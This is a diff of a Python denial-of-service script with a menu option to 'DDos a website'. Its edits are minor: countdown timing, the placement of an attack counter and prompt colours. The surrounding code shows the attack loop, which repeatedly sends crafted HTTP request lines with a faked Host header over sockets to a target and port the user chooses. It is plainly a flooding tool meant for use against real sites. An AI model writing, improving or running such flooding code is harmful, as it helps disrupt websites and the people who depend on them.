@@ -35,11 +35,11 @@ def ddos():
     time.sleep(4)
     print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "DDos starting in ~")
     print("seconds : 3")
-    time.sleep(1)
+    time.sleep(2)
     print("seconds : 2")
-    time.sleep(1)
+    time.sleep(2)
     print("seconds : 1")
-    time.sleep(1)
+    time.sleep(2)
 
     def attack():
         nonlocal attack_num
@@ -50,10 +50,11 @@ def ddos():
                 s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
-                attack_num += 1
                 time.sleep(1)
+                attack_num += 1
                 print(f"{Fore.LIGHTWHITE_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K \033[103mSent massage\033[0m  \033[41m"+ str(attack_num)+"\033[0m \033[94m Starting\033[0m")
                 time.sleep(1)
+                attack_num += 1
                 print(f"{Fore.LIGHTRED_EX}[]  {Fore.LIGHTWHITE_EX}M A L A C K \033[7mSent massage\033[0m  \033[103m"+ str(attack_num)+"\033[0m \033[31m Starting\033[0m")
             except socket.error:
                 time.sleep(1)
@@ -81,14 +82,14 @@ if __name__ == "__main__":
     print_red_centered_art()
 def menu():
    # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
-    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
+    print(Style.BRIGHT + Fore.BLUE + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
     print(Fore.WHITE + Style.BRIGHT + "——————————————————————————————————————————————————————————————————")
     print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
     print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
     print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
     print("Enter your options .. [e.g 1,2]") 
     global usr
-    usr = input(Fore.YELLOW + Style.BRIGHT + "0======>> " )
+    usr = input(Fore.YELLOW + Style.BRIGHT + "••> " )
     if usr == "1":
         ddos()
     elif usr == "2":
